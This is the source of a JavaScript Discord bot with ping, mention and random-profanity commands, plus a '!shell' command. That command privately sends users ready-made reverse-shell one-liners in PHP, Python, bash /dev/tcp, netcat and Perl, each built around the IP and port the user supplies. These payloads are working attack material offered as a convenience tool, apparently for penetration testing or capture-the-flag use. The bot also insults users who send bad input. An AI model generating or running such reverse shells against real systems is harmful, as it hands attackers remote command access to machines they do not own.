require('dotenv').config();
const Discord = require('discord.js');
const bot = new Discord.Client();
const TOKEN = process.env.TOKEN;
const Hacking = require("./hacking.js");
const Profanity = require('./profanity.js');
const htools = new Hacking();
const profanity = new Profanity();


bot.login(TOKEN);



// BOT COMMANDS

/*

  !curse 1-15 Repsond with X random curse words 
  !shell port ip Responds in pm with basic reverse shells

*/




bot.on('ready', () => {
  console.info(`Logged in as ${bot.user.tag}!`);
});

bot.on('message', msg => {
  if (msg.content === 'ping') {
    msg.reply('pong');
    msg.channel.send('pong');
  }

	/* KOPSOU COMMAND */
 else if (msg.content.startsWith("!kopsou")){

    const taggedUser = msg.mentions.users.first()

    msg.channel.send(`<@${taggedUser.id}> :scissors:`).then((message)=>{
      message.react("✂️")
    }).catch((err)=>{
      console.log(err)
    })

  }

  else if (msg.content.startsWith('rtfm') || msg.content.startsWith("!help")){


    let help = "**HELP**"+`\`\`\`bash
!curse 1-15 Responds with X random curse words
!kopsou @mention
!shell ip port Responds in pm with basic reverse shells
\`\`\``


    msg.channel.send(help);

  }

  /* Reverse Shell Command */
  else if (msg.content.startsWith('!shell')){

    try {
      
      let array=  msg.content.replace("!shell").trim(" ").split(" ")

      console.log(array)
      

      const ip = array[1]
      const port = array[2]
  
      let php = `\`\`\`php
php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'\`\`\``
  
      let python = `\`\`\`python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\`\`\``
  
      let bash = `\`\`\`bash
bash -i >& /dev/tcp/${ip}/${port} 0>&1\`\`\``
  
      let nc = `\`\`\`bash
nc -e /bin/sh ${ip} ${port}\`\`\``
   
      let perl = `\`\`\`perl
perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\`\`\``
     
      msg.author.send("**Python**"+python)
      msg.author.send("**Bash**"+bash)
      msg.author.send("**Netcat**"+nc)
      msg.author.send("**PHP**"+php)
      msg.author.send("**Perl**"+perl)

    } catch (error) {
      console.log(error)

      msg.author.send("Wrong Data, please send: !shell ip port")
    }

  } 

  /* Curse Command */
  else if (msg.content.startsWith('!curse')) {
      
      let num = msg.content.split("!curse")

      try {
        num = Number(num[1])
        
        if (num< 1){
          num = 1
        }else if (num >15){
          throw "asd"
        }

        let word = profanity.pickRandom(num)

        msg.reply(word); 
      
      } catch (error) {
     
        msg.reply("Are you seriously this dumb ?"); 
     
      }


  }



});
